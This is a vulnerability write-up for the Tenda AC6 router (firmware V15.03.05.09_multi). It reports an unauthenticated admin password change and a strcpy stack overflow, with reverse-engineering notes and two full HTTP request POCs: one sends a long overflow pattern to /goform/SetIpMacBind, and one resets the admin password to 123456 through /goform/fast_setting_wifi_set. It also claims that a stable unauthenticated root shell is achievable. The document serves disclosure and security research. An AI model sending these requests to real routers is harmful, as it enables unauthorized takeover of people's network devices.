# Tenda AC6 V15.03.05.09_multi Unauthorized stack overflow vulnerability

## Overview

- Manufacturer's website information：https://www.tenda.com.cn/profile/contact.html
- Firmware download address ： https://www.tenda.com.cn/download/default.html

## 1. Affected version

![image-20220215174142153](img/image-20220215174142153.png)

Figure 1 shows the latest firmware Ba of the router

## 2.Vulnerability details

#### 2.1Arbitrary password modification vulnerability

![image-20220215175103625](img/image-20220215175103625.png)

![image-20220215175441246](img/image-20220215175441246.png)

![image-20220215175631393](img/image-20220215175631393.png)

Firstly, through reverse analysis, we can find that there is a vulnerability of arbitrary password modification in the interface.The program passes the contents obtained in the loginpwd parameter directly to V16, and then directly changes the password to the login password through the setvalue() function. In this way, we can change the management password without authorization.

#### 2.2Stack overflow vulnerability

![image-20220217154126118](img/image-20220217154126118.png)

The program first passes the content obtained from the list parameter to V22, and then assigns V22 to Src. Finally, through the strcpy function, the SRC is directly copied to the dest stack without size checking. There is a stack overflow vulnerability.

## 3.Recurring vulnerabilities and POC

In order to reproduce the vulnerability, the following steps can be followed:

1. Use the fat simulation firmware V15.03.05.09_multi
2. Attack with the following  overflow POC attacks

```
POST /goform/SetIpMacBind HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 1053
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/ip_mac_bind.html?random=0.321456590200049&
Cookie: password=e10adc3949ba59abbe56e057f20f883ewvh5gk

bindnum=1&list=RenCvn9c:fc:e8:1a:33:80192.168.0.139aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaeaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae
```

The reproduction results are as follows:

![image-20220214114614959](img/image-20220214114614959.png)

Figure 2 POC attack effect

3.Unauthorized password rewriting POC（The password here is changed to 123456）

```
POST /goform/fast_setting_wifi_set HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: /
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 116
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/index.html

ssid=Tenda_AC6_rencvn&wrlPassword=rencvn667&power=high&timeZone=%2B08%3A00&loginPwd=e10adc3949ba59abbe56e057f20f883e
```

Finally, you can write exp, which can achieve a very stable effect of obtaining the root shell without authorization

![image-20220215180128600](img/image-20220215180128600.png)

